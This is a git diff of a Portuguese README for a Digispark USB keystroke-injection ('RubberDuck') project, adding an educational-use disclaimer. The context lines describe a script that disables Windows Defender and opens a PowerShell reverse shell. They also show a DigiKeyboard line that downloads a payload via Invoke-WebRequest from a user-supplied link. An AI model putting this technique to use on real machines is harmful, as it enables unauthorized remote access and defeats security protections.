@@ -36,3 +36,9 @@ Depois de configurar tudo, sempre inclua esses dois *includes* no início do seu
 Esse script do repositório faz o RubberDuck desativar o Windows Defender da máquina e executar uma *reverse shell* via PowerShell. Recomendo seguir a mesma lógica do script do RubberDuck. Caso queira subir um script diferente na máquina, você deve criar um repositório no GitHub com seu script e colocar o link do seu repositório na linha 49, que ele irá executar baixando via PowerShell.
 #### Exemplo:
           DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'link do seu repositório aqui' -OutFile 'nome_arquivo.aqui'");
+
+
+
+# Aviso de Responsabilidade
+
+Este projeto foi criado exclusivamente para fins educativos, com o objetivo de simular um RubberDuck. Ele não deve ser utilizado em situações que possam causar danos a terceiros, direta ou indiretamente. O autor do repositório não assume qualquer responsabilidade por problemas ou consequências decorrentes do uso inadequado ou mal-intencionado deste código. Use-o com responsabilidade e em conformidade com as leis e normas aplicáveis.
